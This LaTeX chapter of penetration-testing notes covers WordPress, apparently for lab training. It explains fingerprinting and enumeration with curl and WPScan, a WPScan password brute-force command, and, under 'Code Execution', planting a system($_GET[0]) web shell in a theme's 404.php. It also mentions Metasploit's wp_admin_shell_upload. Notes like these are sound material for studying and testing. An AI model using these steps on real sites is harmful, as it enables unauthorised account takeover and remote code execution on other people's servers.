\chapter{Wordpress}

\section{Introduction}
WordPress, launched in 2003, is an open-source Content Management System (CMS)
that can be used for multiple purposes. Itâ€™s often used to host blogs and
forums.

Its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. 

WordPress is written in PHP and usually runs on Apache with MySQL as the backend.


\subsection{File structure}

\subsubsection{Key WordPress Files}
The root directory of WordPress contains files that are needed to configure WordPress to function correctly.
\begin{itemize}
    \item \verb+index.php+ is the homepage of WordPress.
    \item \verb+license.txt+ contains useful information such as the version WordPress installed.
    \item \verb+wp-activate.php+ used for the email activation process when setting up a new WordPress site.
    \item \verb+wp-admin+ folder contains the login page for administrator
        access and the backend dashboard. Once a user has logged in, they can
        make changes to the site based on their assigned permissions. The login
        page can be located at one of the following paths:
        \verb+/wp-admin/login.php+, \verb+/wp-admin/wp-login.php+,
        \verb+/login.php+ or \verb+/wp-login.php+.This file can also be renamed
        to make it more challenging to find the login page.
    \item \verb+xmlrpc.php+ is a file representing a feature of WordPress that
        enables data to be transmitted with HTTP acting as the transport
        mechanism and XML as the encoding mechanism. This type of communication
        has been replaced by the WordPress
        \href{https://developer.wordpress.org/rest-api/reference}{REST API}.
    \item  \verb+wp-config.php+ file contains information required by WordPress
        to connect to the database, such as the database name, database host,
        username and password, authentication keys and salts, and the database
        table prefix. This configuration file can also be used to activate
        DEBUG mode, which can useful in troubleshooting.
\end{itemize}

\subsubsection{Key WordPress Directories}

\begin{itemize}
    \item \verb+wp-content+ folder is the main directory where plugins and
        themes are stored. The subdirectory \verb+uploads/+ is usually where
        any files uploaded to the platform are stored. These directories and
        files should be carefully enumerated as they may lead to contain
        sensitive data that could lead to remote code execution or exploitation
        of other vulnerabilities or misconfigurations.
    \item \verb+wp-includes+ contains everything except for the administrative
        components and the themes that belong to the website. This is the
        directory where core files are stored, such as certificates, fonts,
        JavaScript files, and widgets.
\end{itemize}
\subsection{User roles}

\begin{itemize}
    \item Administrator: This user has access to administrative features within
        the website. This includes adding and deleting users and posts, as well
        as editing source code.

    \item Editor 	An editor can publish and manage posts, including the posts of other users.
    \item Author 	Authors can publish and manage their own posts.
    \item Contributor 	These users can write and manage their own posts but cannot publish them.
    \item Subscriber 	These are normal users who can browse posts and edit their profiles.
\end{itemize}

\section{Discovery/Footprinting}
\subsection{Version}
\subsubsection{Source code version}

\begin{verbatim}
...SNIP...
<link rel='https://api.w.org/' 
        href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD"
            href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" 
        href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" />
<meta name="generator" content="WordPress 5.3.3" />
...SNIP...
\end{verbatim}

\begin{verbatim}
curl -s -X GET http://$TARGET | grep '<meta name="generator"'
\end{verbatim}

\subsection{CSS version}

\begin{verbatim}
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  
    href='http://XX/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' 
    type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  
    href='http://XX/wp-content/themes/ben_theme/style.css?ver=5.3.3' 
    type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  
    href='http://XX/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3'
    type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'
    href='http://XX/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3'
    type='text/css' media='all' />
...SNIP...
\end{verbatim}

\subsubsection{JS version}

\begin{verbatim}
...SNIP...
<script type='text/javascript' 
    src='http://XX/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' 
    src='http://XX/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' 
    src='http://XX/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' 
    src='http://XX/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'>
    </script>
<script type='text/javascript' 
    src='http://XX/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'>
    </script>
...SNIP...
\end{verbatim}

\subsubsection{robots.txt}
\begin{verbatim}
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
\end{verbatim}


\section{Enumeration}

\subsection{Plugins and Themes}

WordPress stores its plugins in the \verb+wp-content/mplugins+ directory. This
folder is helpful to enumerate vulnerable plugins. Themes are stored in the
\verb+wp-content/themes+ directory. These files should be carefully enumerated
as they may lead to RCE.

\subsection{Manual}
\begin{verbatim}
curl -s http://$TARGET | grep WordPress

curl -s http://$TARGET | 
    sed 's/href=/\n/g' | 
    sed 's/src=/\n/g' | 
    grep 'wp-content/plugins/*' | 
    cut -d"'" -f2

curl -s http://$TARGET | 
    sed 's/href=/\n/g' | 
    sed 's/src=/\n/g' | 
    grep 'themes' | 
    cut -d"'" -f2
\end{verbatim}




However, not all installed plugins and themes can be discovered passively. In
this case, a request has to be sent to the server actively to enumerate them.
If the directory or file does exist, either an access or a redirection is
received, indicating that the content does exist. However, we do not have
direct access to it.
\begin{verbatim}
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
Content-Length: 356
Content-Type: text/html; charset=iso-8859-1
\end{verbatim}


If the content does not exist, we will receive a \verb+404 Not Found error.+

\subsection{User enumeration}

\begin{verbatim}
curl -s -I -X GET http://XX/?author=1
\end{verbatim}
In case of \verb+30X+ pay attention to the \verb+Location+ header. Invalid user
are explicitely notified.


The second method requires interaction with the JSON endpoint, which allows us
to obtain a list of users. This was changed in WordPress core after version
4.7.1, and later versions only show whether a user is configured or not. Before
this release, all users who had published a post were shown by default.

\begin{verbatim}
curl http://XX/wp-json/wp/v2/users | jq
\end{verbatim}

\subsection{Login}
\begin{verbatim}
curl -X POST -d
    "<methodCall> \
        <methodName>wp.getUsersBlogs</methodName>   \
        <params> \
            <param><value>admin</value></param> \
            <param><value>CORRECT-PASSWORD</value></param>
        </params> \ 
    </methodCall>" http://XXX/xmlrpc.php
\end{verbatim}

\subsection{WPScan}
\href{https://github.com/wpscanteam/wpscan}{WPScan }is an automated WordPress
scanner and enumeration tool. It determines if the various themes and plugins
used by a blog are outdated or vulnerable.

WPScan is also able to pull in vulnerability information from external sources.
We can obtain an API token from \href{https://wpvulndb.com/}{WPVulnDB}, which
is used by WPScan to scan for PoC and reports.To use the WPVulnDB database,
just create an account and copy the API token from the users page. This token
can then be supplied to wpscan using the \verb+--api-token+ parameter.

\begin{verbatim}
sudo wpscan --url http://IP --enumerate --api-token dEOFB<SNIP>
\end{verbatim}

\section{Login Bruteforce}

WPScan can be used to brute force usernames and passwords. it uses:
\begin{itemize}
    \item \href{https://kinsta.com/blog/xmlrpc-php/}{xmlrpc} (WordPress API to make login attempts through /xmlrpc.php)
        {\bf faster}
        \item wp-login
\end{itemize} 

username should be found by \verb+wpscan --enumerate+

\begin{verbatim}
sudo  wpscan --password-attack xmlrpc -t 20 -U john -P FILE --url URL
\end{verbatim}

\section{Code Execution}

\subsection{Modifying 404.php}
with admin access go to  \verb+Appearance > Theme File Editor+

\begin{verbatim}
system($_GET[0]);
\end{verbatim}

We know that WordPress themes are located at 
\verb+vp-content/themes/<theme name>+

then \verb+curl http:/URL/wp-content/themes/THEME/404.php?0=id+



\subsection{Metasploit}
\verb+wp_admin_shell_upload+ of metasploit~\ref{tool:metasploit} can be used to
automate that process.

\section{Known vulerabilities}
Most vulns are due to plugins

